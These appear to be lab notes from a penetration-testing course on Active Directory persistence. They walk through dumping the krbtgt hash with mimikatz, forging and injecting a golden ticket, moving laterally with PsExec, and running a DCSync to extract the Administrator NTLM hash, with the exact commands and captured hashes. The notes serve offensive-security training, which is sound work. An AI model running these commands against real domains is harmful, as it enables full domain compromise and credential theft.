

# 21.5.1.1.1. Repeat the steps shown above to dump the krbtgt password hash and create and use a golden ticket.

Attempt to laterally move from the Windows 10 workstation to the domain controller via PsExec as the offsec user
`c:\Tools\active_directory>PsExec.exe \\dc01 cmd.exe`
![7dac68044fe302166123ac54b8245389.png](9af59a0bdf2b4198ab9ee182ef4cc204.png)

At this point, it is expected that we have access to a member of the Domain Admins group or compromised the DC itself. This type of access allows us to extract the password hash of the krbtgt account with mimikatz.

First, we simulate a login to the domain controller via remote desktop using the jeff_admin account.
![5cc07d3779406d3e4053a2a9c9a29b62.png](38323996ed7f490eb22754c158b14588.png)

Run mimikatz from the C: folder and extract the password hash of the krbtgt account
`c:\>c:\Tools\mimikatz.exe`
`mimikatz # privilege::debug`
`mimikatz # lsadump::lsa /patch`
![eb93a80b50263b84ae3a3b7d9e6f2e67.png](980fb7f218f84c9ca2e3aa7709706a47.png)

Here is the krbtgt hash info
```plaintext
RID  : 000001f6 (502)                                      
User : krbtgt    LM   :                            
NTLM : fc274a94b36874d2560a7bd332604fab 
```

Copy krbtgt's NTLM hash, and continue the attack on the Windows client. **Remember, creating the golden ticket and injecting it into memory does not require any administrative privileges, and can be performed from a computer that is not joined to the domain.**

Find the SID on the workstation. We see it is:
`corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103`
![e7c7f16a0752c833fa7f9a8ab9711455.png](34ef2b779f324b02857e6d674ac06a4f.png)

Generate the golden ticket. Note that unlike the silver ticket, we use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash.
`mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt`
![981a30ac2feb186628f3e61d2836ca9c.png](375043fe4b8845cfa16363088c7a7a0b.png)

Now that the golden ticket is injected into memory, Run misc::cmd and see a new command prompt appear
`mimikatz # misc::cmd`
![8576c0c5ec7fd34bb676eff667cbbcd8.png](b6a62a513d7444a9ad451ba4ffe2b683.png)
![8cffac8f44d6e270b082361ef6bd4c66.png](70a9254f802b4ee2a7d19eecc9d15380.png)

On this new command prompt, attempt the lateral movement with PsExec again. We see that we are user `fakeuser`
![eab596d2d9cfb62fd7b37e15478c274d.png](8251bd3cae09450e9991f79c46cd75cd.png)
![356301159bfc055a9a2f237535c52ccf.png](ae41817b7c1f474cbd3cd96e3a4a3977.png)
![b2a01acc38f1fdd7fc170edd8ed0679a.png](3a02e9f3087a4fbb877ff06a3d127d98.png)

Essentially we performed the overpass the hash attack by leveraging Kerberos authentication.

**Note if we instead used the domain controller's IP address instead of the domain controllers's hostname, we would instead for the use of NTLM authentication and access would still be blocked. See the example below.**
![f2d4791c57cbb9449f6a2137d6c2ed52.png](c8e8df5af6904e20b133aa5abd4f343f.png)



# 21.5.1.1.2. Why is the password hash for the krbtgt account changed during a functional level upgrade from Windows 2003 to Windows 2008?

The krbtgt password changes as part of the DFL (Domain Functional Level) update to 2008 to support Kerberos AES encryption in which AES hashes (128 and 256) are introduced. The changes only add the AES hashes during the one DFL change from 2003 to any higher domain functional level. The potential to implement other newer/updated encryption types in future OS versions does exist and once again we could run into this issue.


## 21.5.2 
Log into the Win 10 client as jeff_admin to stimulate a compromise of a domain administrat account and perform a replication using lsadump::dcsync. The dump contains multiple hashes associated with the last 29 user psaswords as well as the hashes used with AES encryption.
`mimikatz # lsadump::dcsync /user:Administrator`
![473c00cc32e2b37d34487ed725d0c351.png](1d4d9a121a824f238817acab38d983af.png)
![711b936dfc33ac0d59412a621088f28f.png](b18e4cf47bf84aed8796b50c6fec70a7.png)

The important info to extract is:
`Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e`
